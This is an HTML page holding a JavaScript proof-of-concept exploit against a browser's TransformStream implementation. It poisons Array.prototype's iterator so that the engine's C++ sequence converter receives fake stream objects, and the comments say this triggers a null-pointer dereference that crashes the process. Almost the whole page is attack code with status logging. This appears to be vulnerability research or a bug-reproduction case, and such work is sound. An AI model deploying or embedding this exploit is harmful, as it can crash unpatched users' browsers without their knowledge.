<!DOCTYPE html>
<html>
<head>
<style>
body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; }
</style>
</head>
<body>
<div id="log"></div>
<script>
function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}

log("=== TRANSFORMSTREAM ITERATOR POISONING ===", "info");
log("[*] Setting up the trap on Array.prototype[Symbol.iterator]...", "info");

const originalIterator = Array.prototype[Symbol.iterator];

// This poisons the array returned by createInternalTransformStreamFromTransformer
Array.prototype[Symbol.iterator] = function*() {
    log("[!] TRAP TRIGGERED! The C++ SequenceConverter is reading our array!", "hit");
    
    // Slot 0: transform (C++ accepts JSValue, anything is fine)
    yield {}; 
    
    // Slot 1: readable (C++ does jsDynamicCast<JSReadableStream*>(val)->wrapped())
    // Passing a fake object makes jsDynamicCast return nullptr.
    // nullptr->wrapped() -> INSTANT SEGFAULT.
    yield { fake: "I am not a JSReadableStream" }; 
    
    // Slot 2: writable (C++ does jsDynamicCast<JSWritableStream*>(val)->wrapped())
    yield { fake: "I am not a JSWritableStream" };
};

setTimeout(() => {
    try {
        log("[*] Calling new TransformStream(). Watch the process die...", "info");
        
        // This triggers the C++ path that fetches the JS builtin's array
        // and converts it using SequenceConverter
        new TransformStream();
        
        log("[-] If you see this, the browser survived. (Patched or no crash)", "info");
    } catch (e) {
        log("[-] Caught JS exception: " + e.message, "info");
    } finally {
        // Restore just in case
        Array.prototype[Symbol.iterator] = originalIterator;
    }
}, 1000);
</script>
</body>
</html>
